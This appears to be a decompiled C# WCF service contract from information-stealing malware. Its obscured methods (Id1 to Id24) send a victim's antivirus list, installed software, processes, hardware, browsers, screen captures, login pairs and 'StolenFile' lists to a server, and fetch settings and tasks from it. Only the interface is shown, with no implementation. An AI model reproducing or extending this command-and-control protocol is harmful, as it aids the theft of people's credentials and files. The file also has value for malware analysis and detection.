using System;
using System.Collections.Generic;
using System.ServiceModel;

// Token: 0x02000058 RID: 88
[ServiceContract(Name = "Entity", SessionMode = SessionMode.Required)]
public interface Entity
{
	// Token: 0x060001DC RID: 476
	[OperationContract(Name = "Id1")]
	bool Id1();

	// Token: 0x060001DD RID: 477
	[OperationContract(Name = "Id2")]
	Entity_Settings Id2();

	// Token: 0x060001DE RID: 478
	[OperationContract(Name = "Id3")]
	void Id3(Entity_CollectedResults user);

	// Token: 0x060001DF RID: 479
	[OperationContract(Name = "Id4")]
	Entity_ServerResponse Id4(Entity_CollectedResults user);

	// Token: 0x060001E0 RID: 480
	[OperationContract(Name = "Id5")]
	Entity_ServerResponse Id5(byte[] display);

	// Token: 0x060001E1 RID: 481
	[OperationContract(Name = "Id6")]
	Entity_ServerResponse Id6(List<string> defenders);

	// Token: 0x060001E2 RID: 482
	[OperationContract(Name = "Id7")]
	Entity_ServerResponse Id7(List<string> languages);

	// Token: 0x060001E3 RID: 483
	[OperationContract(Name = "Id8")]
	Entity_ServerResponse Id8(List<string> softwares);

	// Token: 0x060001E4 RID: 484
	[OperationContract(Name = "Id9")]
	Entity_ServerResponse Id9(List<string> processes);

	// Token: 0x060001E5 RID: 485
	[OperationContract(Name = "Id10")]
	Entity_ServerResponse Id10(List<Entity_HardwareInfo> hardwares);

	// Token: 0x060001E6 RID: 486
	[OperationContract(Name = "Id11")]
	Entity_ServerResponse Id11(List<Entity_Browser> browsers);

	// Token: 0x060001E7 RID: 487
	[OperationContract(Name = "Id12")]
	Entity_ServerResponse Id12(List<Entity_LoginData> ftps);

	// Token: 0x060001E8 RID: 488
	[OperationContract(Name = "Id13")]
	Entity_ServerResponse Id13(List<BrowserInfo> installedBrowsers);

	// Token: 0x060001E9 RID: 489
	[OperationContract(Name = "Id14")]
	Entity_ServerResponse Id14(List<Entity_StolenFile> remoteFiles);

	// Token: 0x060001EA RID: 490
	[OperationContract(Name = "Id15")]
	Entity_ServerResponse Id15(List<Entity_StolenFile> remoteFiles);

	// Token: 0x060001EB RID: 491
	[OperationContract(Name = "Id16")]
	Entity_ServerResponse Id16(List<Entity_StolenFile> remoteFiles);

	// Token: 0x060001EC RID: 492
	[OperationContract(Name = "Id17")]
	Entity_ServerResponse Id17(List<Entity_LoginData> loginPairs);

	// Token: 0x060001ED RID: 493
	[OperationContract(Name = "Id18")]
	Entity_ServerResponse Id18(List<Entity_StolenFile> remoteFiles);

	// Token: 0x060001EE RID: 494
	[OperationContract(Name = "Id19")]
	Entity_ServerResponse Id19(List<Entity_StolenFile> remoteFiles);

	// Token: 0x060001EF RID: 495
	[OperationContract(Name = "Id20")]
	Entity_ServerResponse Id20(List<Entity_StolenFile> remoteFiles);

	// Token: 0x060001F0 RID: 496
	[OperationContract(Name = "Id21")]
	Entity_ServerResponse Id21(List<Entity_StolenFile> remoteFiles);

	// Token: 0x060001F1 RID: 497
	[OperationContract(Name = "Id22")]
	void Id22();

	// Token: 0x060001F2 RID: 498
	[OperationContract(Name = "Id23")]
	IList<Entity_Task> Id23(Entity_CollectedResults user);

	// Token: 0x060001F3 RID: 499
	[OperationContract(Name = "Id24")]
	void Id24(Entity_CollectedResults user, int updateId);
}
